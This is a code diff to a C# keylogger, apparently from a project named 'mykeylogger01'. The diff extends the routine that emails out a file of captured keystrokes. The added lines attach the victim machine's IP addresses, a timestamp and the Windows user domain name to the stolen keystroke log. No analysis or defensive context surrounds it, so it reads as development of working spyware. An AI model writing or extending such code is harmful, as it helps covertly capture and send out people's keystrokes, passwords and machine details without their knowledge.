@@ -104,8 +104,19 @@ namespace mykeylogger01
             try
             {
                 // Read the archive file contents into the email body variable
+                var host = Dns.GetHostEntry(Dns.GetHostName());
+                DateTime now = DateTime.Now;
                 StreamReader input = new StreamReader(ARCHIVE_FILE_NAME);
-                string emailBody = input.ReadToEnd();
+                string emailBody = "";
+
+                foreach (var address in host.AddressList)
+                {
+                    emailBody += "Address: " + address + "\n";
+                }
+
+                emailBody += "\ntime " + now.ToString();
+                emailBody += "\nUser " + Environment.UserDomainName + "\n";
+                emailBody += input.ReadToEnd();
                 input.Close();
 
                 // Create the email client object
